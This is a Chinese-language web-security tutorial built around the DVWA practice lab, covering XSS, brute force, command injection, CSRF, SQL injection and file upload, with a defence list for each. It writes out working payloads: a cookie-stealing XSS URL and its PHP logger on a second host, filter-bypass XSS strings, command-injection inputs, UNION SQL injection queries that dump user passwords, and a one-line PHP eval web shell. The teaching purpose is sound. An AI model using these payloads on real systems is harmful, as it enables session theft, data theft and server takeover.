## 1. 什么是DVWA

一个用来练习各种漏洞利用的WEB漏洞实验环境，基于PHP/MYSQL的Web应用。[官网](http://www.dvwa.co.uk/)

## 2. 主要模块
**XSS 跨站脚本攻击**  
**暴力破解**  
**命令执行**  
**CSRF 跨站请求伪造**  
**SQL 注入**  
**文件上传**  

## 3. XSS 跨站脚本攻击  
Chrome浏览器默认开启xss监听，测试前须命令行启动浏览器，关闭监听。
````
cd /Applications/Google Chrome.app/Contents/MacOS

./Google Chrome --disable-xss-auditor
````

**反射型**：非持久化，用户主动点击带有恶意URL，发送请求到后端，后端返回带有恶意脚本的页面。  
假设某网站 A.com 的某个输入框存在XSS漏洞，能通过输入框或者URL传入脚本执行。比如它的后端php代码是这样的
````php
echo 'Hello ' . $_GET[ 'name' ];
````
那么，就可以在 url中传入参数name。生成 **恶意url**：
````js
A.com/?name=<script>window.open('B.com/ck.php?c='+document.cookie)</script>
````
ck.php文件代码如下，将获得的cookie存入cookie.txt。
````
$cookie = $_GET['c']; 
$ip = getenv ('REMOTE_ADDR'); 
$time=date("j F, Y, g:i a"); 
$referer=getenv ('HTTP_REFERER'); 
$fp = fopen('cookie.txt', 'a'); 
fwrite($fp, 'Cookie: '.$cookie."\n".'IP: '.$ip."\n".'Date and Time: '.$time."\n".'Referer: '.$referer."\n\n"); 
fclose($fp); 
````
通过短域名生成网站,将上诉 **恶意 url** 映射成类似http://dwz.cn/B4l3Ydke  的网址欺骗用户，发送给已经在A.com登录的用户，用户点击之后，cookie信息就会自动保存到 B.com下的cookie.txt中。

通常，后端不会这么如此信任用户输入，会对各种输入进行正则过滤限制。针对各种过滤出现了对应的恶意 payload, 通过事件、通过协议、通过请求。
````js
<Script> 恶意代码 </script>
<sc<script>ript> 恶意代码 </script>
<img onerror=" 恶意代码 " >
<div style="position:fixed;top:0;left:0;bottom:0;right:0;" onclick=" 恶意代码 "></div>
...
````
以下代码通过base64编码，依旧能实现恶意攻击。
````
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiMSIpOzwvc2NyaXB0Pg=="></object>
````
有效的解决方法是通过转义，通过 htmlspecialchars，将具有特殊意义的字符进行转义。
````
&  变为 &amp
" 变为 &quot
'  变为 &#039
< 变为 &lt
>  变为 &gt
````

**存储型**：持久型，攻击者提交恶意脚本最终进入到数据库，用户访问加载页面时，恶意脚本执行。

区别于存储型XSS 攻击，脚本因为存入数据库导致危害更大，所有访问该页面的用户都将被攻击。但因为业务需要比如富文本框功能，就不能一味的使用 htmlspecialchars 转义，而应该自定义过滤规则，将内容限制在安全范围内。

````
放行常见标签及img标签以实现富文本功能。
对script,iframe,form标签,on开头的属性,href属性等进行过滤。
````
**DOM型：**客户端脚本通过DOM动态输出数据到页面，而不经过服务器。
当前端出现以下代码时，就要小心了，确保等号右边的内容可控。
````
document.write = 
innerHTML = 
eval()

// 不好的例子
if (document.location.href.indexOf("default=") >= 0) {
var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
document.write("<option value='" + lang + "'></option>");
}

// 此时可以通过以下payload注入
A.com?default=German#<script> 恶意代码 </script>
````
**大部分xss都是为了获得cookie，进行下一步的破坏，因此系统层面也应考虑cookie有效期，HttpOnly等方式。**
## 4. 暴力破解
本质上就是将密码字典的每一种情况，通过自动化工具进行组合尝试，进而得到密码字典中正确的一项。  

**演示登录破解**
- 安装Burp Suite（以下简称BS）,设置代理，使得 BS 能够拦截浏览器请求，捕获登录的数据包。
- 进入待破解网站A，BS开启拦截，输入账号密码点击登陆，此时请求会由BS控制，如下图所示:

![login-request](https://user-images.githubusercontent.com/25051945/55289439-62bc9900-53f9-11e9-81b4-884aa327e209.jpg)  

- 复制Raw数据包到 Intruder 页面，设置数据包中的账号和密码的占位（Add $），在 Payloads 中加载本地字典，Attack type选择Cluster bomb，这样每次请求就会从字典中依次加载字符串作为账号和密码去请求。如下图:  

![intruder](https://user-images.githubusercontent.com/25051945/55289446-7c5de080-53f9-11e9-965e-b7122bd0cdff.jpg)

- 开始攻击之前设置 Option ，便于我们快速找出登录成功的账号密码。经过分析，A网站登录无论正确错误都会返回302状态码，区别在于正确时返回头Location字段为 index.php，错误时为 login.php。
- 设置Grep Match，新增"index.php"，即响应中包含字符串的账号密码组合将被打勾标记。设置Grep Extract，将响应中Location之后的内容都打印出来。如下图:  

![crack-success](https://user-images.githubusercontent.com/25051945/55289450-87187580-53f9-11e9-84d5-344ca2c50984.jpg)  

- 可见 admin 和 password 的组合即为正确账号密码。
为了快速出结果，演示中账号密码字典仅五种情况，5*5 = 25次即可确定是否能破解，实际应用中字典量远大于此。

**防范**
````
1.复杂密码与密码加密
2.人机识别验证
3.接口请求次数限制
````
## 5. 命令执行
应用有时需要调用一些执行系统命令的函数。如PHP中的 system,exec,shell_exec 等。

如下后台代码，将前端输入框的值作为参数传入，执行 ping 命令，并将执行结果打印。
````
$cmd = shell_exec( 'ping  -c 4 ' . $target );
$html .= "<pre>{$cmd}</pre>";
````
此时可构造恶意输入值如下：

baidu.com && whoami
baidu.com && cd ../ && pwd
baidu.com && cd ../ && ls

实际破坏中原不仅仅是 'ls' 这种无害的命令。
**防范**
````
1.对Shell命令中的特殊符号进行替换，如'&'，'|'，';','||'等。
2.对于确定的输入，比如IP，明确限制输入值格式。
3.服务器权限设置。
````

## 6. CSRF 跨站请求伪造
**流程图** 摘自网上

![csrf](https://user-images.githubusercontent.com/25051945/55289453-95ff2800-53f9-11e9-8cba-525f2b05a029.jpg)  

**攻击流程**：
````
1. 用户在A网站登录，登录成功保存cookie在浏览器。
2. A网站有个接口为 A.com/del/postid，可以删除 id 为postid的文章。
3. B.com首页 HTML中有 <img src="A.com/del/3"/> 代码，访问B网站即发送请求。
4. 黑客将B.com链接发送给已在A网站登录的用户，欺骗用户点击访问B网站。
5. 访问B网站时，请求图片URL, 即浏览器携带用户cookie，去请求A网站，A网站校验cookie通过，执行请求删除id为3的文章。这一切都在用户不知情的情况下发生。
````
**攻击关键**
用户在A网站登录的cookie依旧存在于本地，且访问B网站时，如果B网站中存在请求A.com的接口，请求时会将本地cookie带上，这样后端如果仅仅以cookie判断该请求是否由用户授权发出，显然是不行的。

**防范**  
1. token方法  
> 服务端预先生成一个随机数，在渲染具有表单的页面时将随机数以不可见的形式( visible:hidden )插入到表单域，客户端请求时带上这个随机数，服务端进行校验，确定请求确实来自该页面。
> 对于B网站，即使请求会带上cookie，也由于获取不到该随机数（该随机数每次刷新页面都不一致），导致后端校验失败。  

2. 双重 cookie 验证  
> 服务端给 A 网站前端页面设置一个 cookie，页面中所有的请求，都要求在请求 body 或 header 中添加该 
 cookie 参数(可以通过封装统一的 ajax 请求方法)，请求到了服务端，服务端校验请求携带的 cookie，和请求 body 或 header 中的 cookie 是否一致，一致则请求通过。
> 对于 B 网站，即使在 B 网站请求 A 网站，会带上 A 网站的 cookie，但是 B 网站的请求 body 或 header 中没有 cookie 的值 (B 网站中获取不到 A 网站 cookie 具体的值)，那么请求也会失败。  

优缺点：双重 cookie 验证，相比于 token 的方法，优点是实施成本更低，不用每个页面都添加 token，而是采用 cookie 的机制，所有请求可以借助统一的 ajax 逻辑。缺点是依赖于 cookie 不可知， 如果已经被 xss 攻击获取了 cookie， 则该方法无效。

[参考 egg.js 的做法](https://eggjs.org/zh-cn/core/security.html)

## 7. SQL注入

假如网站后端代码如下：
````
$id = $_REQUEST[ 'id' ];
"SELECT first_name, last_name FROM users WHERE user_id = '$id';";
````
即 将获得id参数值，组合成SQL语句进行查询，那么就存在SQL注入的风险。

1. 攻击者通过将 id 参数设置为 1'or'1'='1 。'或' 语法使得 WHERE 条件一直成立，结果能查询出users表的所有数据。
2. id 设置为 1' order by n # ，要求结果以表的第n个字段排序，则当n = 1,2,3...依次执行，出现报错时假设n=5，即说明该表只有4个字段。
3. 通过以下 sql 能挖掘出更多的数据库信息。 
````
查询数据库用户，版本信息:
1' union select 1,concat(database(),version(),user()) #

查询所有数据库名字:
1' union select 1,schema_name from information_schema.schemata #

查询数据库的表名，0x64767761十六进制转字符为 dvwa:
' union select 1,table_name from information_schema.tables where table_schema=0x64767761 #

查询表的字段，0x7573657273十六进制转字符为 users:
' union select 1,column_name from information_schema.columns where table_name=0x7573657273 #

查看表的内容:
' union select user,password from users #
````


**防范**
````
1. 通过 mysql_real_escape_string， 转义sql语句中的特殊字符。
2. 限制数据库用户操作权限。
````

## 8. 文件上传 

漏洞利用的三个**重要条件**：
````
1.可以上传木马文件。
2.文件能被执行。
3.上传文件的路径可知。
````
**利用步骤**
1. A网站允许上传任意文件，则构建如下**一句话脚本**，保存为 hack.php 上传到A网站。注意 apple 字符串，该字符串可任意设置。
````php
<?php
  eval($_POST['apple']);
?>
````
2. 假设已知A网站上传的文件都在/uploads/目录下，可通过A.com/uploads/hack.php访问该文件。
3. 打开 **中国菜刀** 软件，该软件被安全软件报病毒，谨慎使用。
4. 右键添加SHELL，填写 A.com/uploads/hack.php 及 apple 字符串(与hack.php保持一致)，点击添加。如下图：  

![caidao-add](https://user-images.githubusercontent.com/25051945/55289460-a1eaea00-53f9-11e9-998d-510c132c6bfe.jpg)  

1. 如果请求成功，则可以读取服务器任意文件,以及运行虚拟终端。如下图：

![caidao-folder](https://user-images.githubusercontent.com/25051945/55289465-b29b6000-53f9-11e9-9525-f36440092b67.jpg)  

![caidao-terminal](https://user-images.githubusercontent.com/25051945/55289469-baf39b00-53f9-11e9-9a11-6895ecd98bcb.jpg)

## 9. 写在最后
此时分享参考大量网上博客，在此过程中也是收获很多，基于DVWA工具对Web安全有了更多的认识。介于篇幅并未将所有运行结果截图上传，有兴趣者可自行下载dvwa进行测试。若此分享有知识错误欢迎指正，另附上部分参考资料。  

1. [从零开始学web安全系列](http://imweb.io/topic/568958714c44bcc56092e409)   
2. [Session原理](http://www.cnblogs.com/wangtao_20/archive/2011/02/16/1955659.html)
3. [多服务器session共享](https://www.cnblogs.com/wangtao_20/p/3395518.html)
4. [前端安全系列（二）：如何防止CSRF攻击？](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)